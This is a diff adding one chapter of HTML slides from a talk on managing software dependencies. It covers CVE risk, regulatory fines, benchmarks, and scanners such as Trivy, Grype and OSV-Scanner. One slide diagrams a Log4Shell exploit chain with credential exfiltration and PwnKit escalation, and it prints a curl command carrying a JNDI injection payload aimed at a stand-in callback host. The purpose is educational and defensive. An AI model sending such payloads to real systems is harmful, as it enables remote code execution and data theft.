@@ -1,0 +1,311 @@
+<section>
+    <section class="chapter-slide">
+        <div class="chapter-num">01</div>
+        <span class="chapter-kicker">Chapter 01</span>
+        <h1>The Problem</h1>
+        <div class="chapter-rule"></div>
+        <h2>Managing Your Software Dependencies</h2>
+    </section>
+
+    <section>
+        <img src="pictures/Sculpture.jpg" class="r-stretch">
+    </section>
+
+    <section>
+        <h2>Dependencies Example</h2>
+        <div class="box box-blue medium" style="margin-top:0.8em;">
+            <span class="java-pill">☕ Java example</span>
+            <div class="puml-wrap">
+                <img data-puml-src="architecture-example.puml" alt="Same nested layers, each annotated with a concrete example: the Docker image tag, the OS distribution, the JVM runtime, the compiled jar, and its bundled dependencies.">
+            </div>
+        </div>
+    </section>
+
+
+    <section>
+        <h2>🚨 Many Dependencies</h2>
+        <div class="medium">
+            <ul class="icon-list" style="margin-top:0.8em;">
+                <li><span class="ic">🧩</span><span>Every application has <strong>direct</strong> and <strong>transitive</strong> dependencies, often hundreds</span></li>
+                <li><span class="ic">🎲</span><span>Potential Common Vulnerabilities and Exposures (CVEs)</span></li>
+            </ul>
+        </div>
+    </section>
+
+    <section>
+        <h2>The Compounding Cost of Delay</h2>
+        <div class="medium">
+            <ul class="icon-list">
+                <li><span class="ic">🔐</span><span><strong>Security:</strong> more versions to jump over when a CVE forces your hand</span></li>
+                <li><span class="ic">⚡</span><span><strong>Performance:</strong> you leave free speed on the table</span></li>
+                <li><span class="ic">🧗</span><span><strong>Migration effort:</strong> small incremental hops are easy</span></li>
+            </ul>
+        </div>
+    </section>
+
+    <section>
+        <h2>⚖️ It's Not Just Best Practice Anymore</h2>
+        <img src="pictures/Law.jpg" class="r-stretch">
+    </section>
+
+    <section>
+        <h2>⚖️ Australia: What Actually Got Fined</h2>
+        <div class="box box-red medium" style="margin-top:0.6em;">
+            <table style="margin-top:0.4em;">
+                <thead><tr><th>Case</th><th>What happened</th></tr></thead>
+                <tbody>
+                    <tr><td>Australian Clinical Labs, 2025</td><td>First-ever penalty under the Act: <strong>$5.8M</strong>. The 2022 breach itself (223,000 people) wasn't the trigger; a ~3-week delay notifying the regulator was, despite knowing it could have notified within 2–3 days.</td></tr>
+                    <tr><td>Medibank, ongoing</td><td>9.7M people's health data exposed (2022). OAIC is suing for up to <strong>$2.22M per contravention</strong>; press has floated exposure running to trillions if that's read per affected person. Still before the Federal Court.</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <section>
+        <img src="pictures/Talk_to_the_hand.jpg" class="r-stretch">
+    </section>
+
+    <section>
+        <h2>Concrete Examples</h2>
+        <ul class="icon-list medium" style="max-width:480px;margin:0.8em auto 0;">
+            <li><span class="ic">🚀</span><span>Performance benefit</span></li>
+            <li><span class="ic">🦠</span><span>Vulnerable application</span></li>
+            <li><span class="ic">🔎</span><span>Known vulnerabilities</span></li>
+        </ul>
+    </section>
+
+    <section class="example-slide">
+        <span class="example-kicker">Example 1 of 3</span>
+        <h1>🚀 Performance Benefit</h1>
+        <div class="example-rule"></div>
+    </section>
+
+    <section>
+        <h2>🔍 Performance Benchmarks: Full Report</h2>
+        <div class="iframe-wrap">
+            <iframe src="https://johanjanssen.github.io/Keep-Up-To-Date/Benchmarks/" loading="lazy" title="Java performance benchmark report"></iframe>
+        </div>
+        <p class="small" style="margin-top:0.4em;">
+            <a class="go-btn" href="https://johanjanssen.github.io/Keep-Up-To-Date/Benchmarks/" target="_blank">↗ Open in new tab</a>
+        </p>
+    </section>
+
+    <section class="example-slide">
+        <span class="example-kicker">Example 2 of 3</span>
+        <h1>🦠 Vulnerable Application</h1>
+        <div class="example-rule"></div>
+    </section>
+
+    <section>
+        <h2>🧨 Anatomy of the Exploit Chain</h2>
+        <div class="medium" style="max-width:860px;margin:0.4em auto 0;">
+            <svg viewBox="0 0 900 430" style="width:100%;height:auto;" role="img"
+                 aria-label="The attacker sends one curl request carrying a JNDI payload to the victim application. The victim's Log4j resolves the lookup by contacting the attacker's LDAP server on port 1389, which answers with a reference to a malicious class. The victim then downloads and executes that class from the attacker's HTTP server on port 9999, exfiltrating recon and credential data back to the same server, where a live dashboard logs it. Optionally, if the victim process is not already root, it attempts the PwnKit privilege-escalation exploit locally.">
+                <defs>
+                    <marker id="logArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse">
+                        <path d="M0,0 L10,5 L0,10 z" fill="#586e75"/>
+                    </marker>
+                    <marker id="logArrowRed" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse">
+                        <path d="M0,0 L10,5 L0,10 z" fill="#dc322f"/>
+                    </marker>
+                    <marker id="logArrowPink" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse">
+                        <path d="M0,0 L10,5 L0,10 z" fill="#d33682"/>
+                    </marker>
+                </defs>
+
+                <!-- Attacker (person running the demo) -->
+                <rect x="20" y="170" width="180" height="90" rx="8" fill="rgba(220,50,47,0.08)" stroke="#dc322f" stroke-width="1.5"/>
+                <text x="110" y="200" text-anchor="middle" font-family="Inter,sans-serif" font-weight="700" font-size="14" fill="#586e75">🧑‍💻 Attacker</text>
+                <text x="110" y="219" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#657b83">runs the curl command</text>
+
+                <!-- Victim -->
+                <rect x="280" y="140" width="260" height="150" rx="8" fill="rgba(38,139,210,0.08)" stroke="#268bd2" stroke-width="1.5"/>
+                <text x="410" y="168" text-anchor="middle" font-family="Inter,sans-serif" font-weight="700" font-size="16" fill="#586e75">💻 Victim</text>
+                <text x="410" y="188" text-anchor="middle" font-family="monospace" font-size="10.5" fill="#657b83">Java 11 / Spring Boot 2.7</text>
+                <text x="410" y="203" text-anchor="middle" font-family="monospace" font-size="10.5" fill="#657b83">log4j-core 2.14.1 (pre-patch)</text>
+                <text x="410" y="218" text-anchor="middle" font-family="monospace" font-size="10.5" fill="#657b83">:8080/api/products/search</text>
+
+                <!-- Attacker's Callback Server outer band -->
+                <rect x="620" y="40" width="260" height="350" rx="8" fill="rgba(220,50,47,0.05)" stroke="#dc322f" stroke-width="1.5" stroke-dasharray="4 3"/>
+                <text x="750" y="60" text-anchor="middle" font-family="Inter,sans-serif" font-weight="700" font-size="13" fill="#586e75">Attacker's Callback Server</text>
+
+                <rect x="645" y="88" width="210" height="78" rx="7" fill="rgba(203,75,22,0.12)" stroke="#cb4b16" stroke-width="1.25"/>
+                <text x="750" y="112" text-anchor="middle" font-family="Inter,sans-serif" font-weight="600" font-size="13" fill="#586e75">LDAP :1389</text>
+                <text x="750" y="130" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#657b83">serves a JNDI reference</text>
+                <text x="750" y="145" text-anchor="middle" font-family="monospace" font-size="9" fill="#657b83">→ ldap://callback:1389/pwnkit</text>
+
+                <rect x="645" y="255" width="210" height="90" rx="7" fill="rgba(203,75,22,0.12)" stroke="#cb4b16" stroke-width="1.25"/>
+                <text x="750" y="279" text-anchor="middle" font-family="Inter,sans-serif" font-weight="600" font-size="13" fill="#586e75">HTTP :9999</text>
+                <text x="750" y="297" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#657b83">serves ExploitPayload.class</text>
+                <text x="750" y="311" text-anchor="middle" font-family="monospace" font-size="9" fill="#657b83">+ live dashboard, logs every callback</text>
+
+                <!-- Optional PwnKit escalation, local to the victim -->
+                <rect x="280" y="330" width="260" height="70" rx="8" fill="rgba(211,54,130,0.08)" stroke="#d33682" stroke-width="1.25" stroke-dasharray="4 3"/>
+                <text x="410" y="352" text-anchor="middle" font-family="Inter,sans-serif" font-weight="600" font-size="12" fill="#586e75">⑤ Optional: PwnKit</text>
+                <text x="410" y="368" text-anchor="middle" font-family="monospace" font-size="9" fill="#657b83">Optional pkexec used to get root access</text>
+
+                <!-- 1: Attacker -> Victim -->
+                <line x1="203" y1="205" x2="275" y2="205" stroke="#dc322f" stroke-width="1.5" marker-end="url(#logArrowRed)"/>
+
+                <!-- 2: Victim -> LDAP -->
+                <line x1="543" y1="178" x2="640" y2="127" stroke="#586e75" stroke-width="1.25" marker-end="url(#logArrow)"/>
+
+                <!-- 3: LDAP -> Victim (reference back) -->
+                <line x1="640" y1="152" x2="543" y2="228" stroke="#586e75" stroke-width="1.25" marker-end="url(#logArrow)"/>
+
+                <!-- 4: Victim -> HTTP -->
+                <line x1="543" y1="272" x2="640" y2="300" stroke="#586e75" stroke-width="1.25" marker-end="url(#logArrow)"/>
+
+                <!-- 5: escalation loop -->
+                <line x1="410" y1="290" x2="410" y2="325" stroke="#d33682" stroke-width="1.25" stroke-dasharray="3 3" marker-end="url(#logArrowPink)"/>
+            </svg>
+        </div>
+        <div class="box box-red medium" style="margin-top:0.6em;">
+            <pre><code class="language-bash">curl "http://victim:8080/api/products/search?q=\${jndi:ldap://callback:1389/pwnkit}"</code></pre>
+        </div>
+    </section>
+
+    <section>
+        <h2>Defense in Depth</h2>
+        <ul class="icon-list">
+            <li><span class="ic">🐳</span><span>No (old) Docker image</span></li>
+            <li><span class="ic">📦</span><span>No (old) OS packages like curl, wget, gcc, pkexec and runtime</span></li>
+            <li><span class="ic">📚</span><span>No (old) application dependencies</span></li>
+            <li><span class="ic">🔒</span><span>No root access</span></li>
+        </ul>
+    </section>
+
+    <section class="example-slide">
+        <span class="example-kicker">Example 3 of 3</span>
+        <h1>🔎 Known Vulnerabilities</h1>
+        <div class="example-rule"></div>
+    </section>
+
+    <section>
+        <h2>🔍 Different Tools</h2>
+        <div class="two-col medium" style="margin-top:0.8em;">
+            <div class="box box-blue">
+                <h3>Layer 1: Source / Build</h3>
+                <ul class="icon-list">
+                    <li><span class="ic">☕</span><span><strong>OWASP Dependency Check</strong>: manifest only, NVD database</span></li>
+                    <li><span class="ic">🌐</span><span><strong>OSV-Scanner</strong>: lockfiles &amp; SBOMs, OSV.dev database</span></li>
+                </ul>
+            </div>
+            <div class="box box-green">
+                <h3>Layer 2: Runtime / Image</h3>
+                <ul class="icon-list">
+                    <li><span class="ic">🌐</span><span><strong>Grype</strong>: built image, Anchore's own feed</span></li>
+                    <li><span class="ic">🌐</span><span><strong>Trivy</strong>: built image, widest DB + secrets/misconfig</span></li>
+                    <li><span class="ic">🌐</span><span><strong>OSV-Scanner</strong>: built image too, same OSV.dev database</span></li>
+                </ul>
+            </div>
+        </div>
+    </section>
+
+    <section>
+        <h2>Layer 1: Source-Level Scanning</h2>
+        <div class="box box-blue medium" style="margin-top:0.5em;">
+            <span class="java-pill">☕ OWASP Dependency Check (Java)</span>
+            <p class="small" style="margin:0.2em 0 0;">Analyzers for Java (Maven/Gradle), .NET, Node.js, Python and others; this demo uses the Maven plugin.</p>
+            <pre><code class="language-xml">&lt;plugin&gt;
+    &lt;groupId&gt;org.owasp&lt;/groupId&gt;
+    &lt;artifactId&gt;dependency-check-maven&lt;/artifactId&gt;
+    &lt;configuration&gt;
+        &lt;failBuildOnCVSS&gt;7&lt;/failBuildOnCVSS&gt;  &lt;!-- fail on HIGH+ --&gt;
+    &lt;/configuration&gt;
+&lt;/plugin&gt;</code></pre>
+            <pre><code class="language-bash">./mvnw dependency-check:check
+# log4j-core-2.0.jar      → CVE-2021-44228 CRITICAL 10.0 🔴
+# jackson-databind-2.9.10 → CVE-2019-14379 CRITICAL  9.8 🔴</code></pre>
+        </div>
+        <p class="small">
+            <a class="go-btn" href="https://johanjanssen.github.io/Keep-Up-To-Date/OWASP" target="_blank">▶ View OWASP Dependency Check Report</a>
+        </p>
+    </section>
+
+    <section>
+        <h2>Layer 2: Image / Artifact Scanning</h2>
+        <div class="box box-blue medium" style="margin-top:0.5em;">
+            <span class="java-pill">🌐 Trivy (Aqua)</span>
+            <pre><code class="language-bash">trivy image eclipse-temurin:25-jre
+trivy image --format sarif --output trivy-results.sarif eclipse-temurin:25-jre
+trivy image --severity HIGH,CRITICAL --exit-code 1 eclipse-temurin:25-jre</code></pre>
+        </div>
+        <div class="box box-blue medium" style="margin-top:0.5em;">
+            <span class="java-pill">🌐 Grype (Anchore)</span>
+            <pre><code class="language-bash">grype eclipse-temurin:25-jre
+grype eclipse-temurin:25-jre -o sarif > grype-results.sarif
+grype eclipse-temurin:25-jre --fail-on high</code></pre>
+        </div>
+    </section>
+
+    <section>
+        <h2>OSV-Scanner Operates on Both Layers</h2>
+        <div class="medium">
+            <p>One CLI that reads lockfiles, SBOMs <em>and</em> images across 20+ ecosystems, all against the same open OSV database.</p>
+        </div>
+        <div class="box box-blue medium" style="margin-top:0.6em;">
+            <span class="java-pill">🌐 osv-scanner</span>
+            <pre><code class="language-bash">osv-scanner scan source --lockfile=pom.xml .
+osv-scanner scan image eclipse-temurin:25-jre
+osv-scanner scan --sbom=target/bom.json .</code></pre>
+        </div>
+    </section>
+
+    <section>
+        <img src="pictures/Search.jpg" class="r-stretch">
+    </section>
+
+    <section>
+        <h2>🔍 Compare-Scans: Full Report</h2>
+        <div class="iframe-wrap wide">
+            <iframe src="https://johanjanssen.github.io/Keep-Up-To-Date/image-scans" loading="lazy" title="Compare Security Scans report"></iframe>
+        </div>
+        <p class="small" style="margin-top:0.4em;">
+            <a class="go-btn" href="https://johanjanssen.github.io/Keep-Up-To-Date/image-scans/" target="_blank">↗ Open in new tab</a>
+        </p>
+    </section>
+
+    <section>
+        <h2>🔥 Log4Shell</h2>
+        <div class="stat-row medium">
+            <div class="stat-tile"><span class="num">10.0</span><span class="lbl">CVSS score: the maximum possible</span></div>
+            <div class="stat-tile"><span class="num">93%</span><span class="lbl">of cloud environments exposed</span></div>
+            <div class="stat-tile"><span class="num">2 hrs</span><span class="lbl">for the vendor to ship a patch</span></div>
+            <div class="stat-tile"><span class="num">Weeks</span><span class="lbl">for most teams to actually deploy it</span></div>
+        </div>
+        <div class="box box-red medium" style="margin-top:0.5em;">
+            <strong>The bill:</strong> billions of dollars in remediation, lost productivity, and follow-on attacks; fixing it consumed up to <strong>12%</strong> of some organizations' entire annual IT, application-development, and security budgets, all for one transitive dependency.
+        </div>
+    </section>
+
+    <section>
+        <img src="pictures/Mirror.jpg" class="r-stretch">
+    </section>
+
+    <section>
+        <h2>How's Your Situation?</h2>
+        <div class="medium">
+            <ul class="icon-list" style="margin-top:0.8em;">
+                <li><span class="ic">❓</span><span>What software (versions) are you using?</span></li>
+                <li><span class="ic">❓</span><span>How many known security vulnerabilities has your application?</span></li>
+                <li><span class="ic">❓</span><span>Do you remove dead code and unused operating system packages and libraries?</span></li>
+                <li><span class="ic">❓</span><span>How often do you upgrade your software?</span></li>
+            </ul>
+        </div>
+    </section>
+
+    <section>
+        <h2>It's Easy to Blame Management</h2>
+        <div class="medium">
+            <ul class="icon-list" style="margin-top:0.8em;">
+                <li><span class="ic">🤔</span><span>Who benefits most from new software?</span></li>
+                <li><span class="ic">📉</span><span>Overestimating an upgrade results in delays or cancellations</span></li>
+                <li><span class="ic">⏱️</span><span>Spend one spare hour investigating; it's usually smaller than feared</span></li>
+                <li><span class="ic">🛠️</span><span>Modern tooling makes upgrades far easier than a few years ago</span></li>
+                <li><span class="ic">🗣️</span><span>It's not easy to convince management to spend time on it</span></li>
+                <li><span class="ic">😒</span><span>Even developers complain about automated upgrades</span></li>
+            </ul>
+        </div>
+    </section>
+</section>
